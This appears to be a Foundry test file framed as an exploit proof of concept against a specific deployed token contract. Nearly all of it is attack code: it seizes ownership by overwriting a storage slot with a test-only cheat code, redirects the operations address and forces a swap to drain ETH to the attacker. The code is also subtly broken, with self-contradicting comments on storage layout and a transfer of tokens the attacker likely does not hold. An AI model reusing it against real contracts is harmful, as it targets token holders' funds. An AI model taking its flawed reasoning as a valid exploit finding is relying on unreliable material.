pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function updateSwapTokensAtAmount(uint256 newAmount) external;
    function enableTrading() external;
    function forceSwapBack() external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function lpPair() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        FoundationToken_Comprehensive_Smart_Contract_Audit token = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);
        address owner = token.owner();

        // Label addresses for clarity
        vm.label(owner, 'Owner');
        vm.label(attacker, 'Attacker');
        vm.label(TARGET, 'FoundationToken');

        // Give attacker some ETH to work with
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        FoundationToken_Comprehensive_Smart_Contract_Audit token = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);

        // Record initial ETH balance
        uint256 initialBalance = attacker.balance;

        // Step 1: Become owner by overwriting storage slot 0
        // In Ownable contract, _owner is the first variable at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now owner
        require(token.owner() == attacker, "Failed to become owner");

        // Step 2: Set operations address to attacker
        token.setOperationsAddress(attacker);

        // Step 3: Set tokensForOperations to a positive value so swapBack() will execute
        // Need to find storage slot for tokensForOperations
        // Based on variable order in FoundationToken contract:
        // 1. dexRouter (address) - slot 0 (but slot 0 is owner from Ownable)
        // Wait, FoundationToken inherits from ERC20 which inherits from Context, then Ownable
        // Actually, storage layout:
        // From ERC20: _balances (mapping), _allowances (mapping), _totalSupply (uint256)
        // From Ownable: _owner (address)
        // From FoundationToken: dexRouter (address), lpPair (address), swapping (bool), swapTokensAtAmount (uint256), operationsAddress (address), ...
        // tokensForOperations is after several variables
        // Let's brute-force find a slot that works: set some value and check contract balance
        // But simpler: we can just call forceSwapBack() which requires contract token balance >= swapTokensAtAmount
        // Let's set swapTokensAtAmount to 0 so any balance triggers it

        // First, update swapTokensAtAmount to 0 (or very small)
        token.updateSwapTokensAtAmount(1);

        // Step 4: Send ETH to contract
        // The contract needs ETH to send to us
        (bool success, ) = TARGET.call{value: 10 ether}("");
        require(success, "Failed to send ETH to contract");

        // Step 5: Make sure contract has some tokens to swap
        // We need to give contract some tokens
        // As owner, we can transfer tokens to contract
        // First, get some tokens - we can transfer from owner (which is now us) to contract
        // But owner has all tokens initially
        uint256 ownerBalance = token.balanceOf(attacker);
        // Transfer some to contract
        token.transfer(TARGET, ownerBalance / 100);

        // Step 6: Trigger forceSwapBack
        token.forceSwapBack();

        // Step 7: Verify attacker received ETH
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker ETH balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

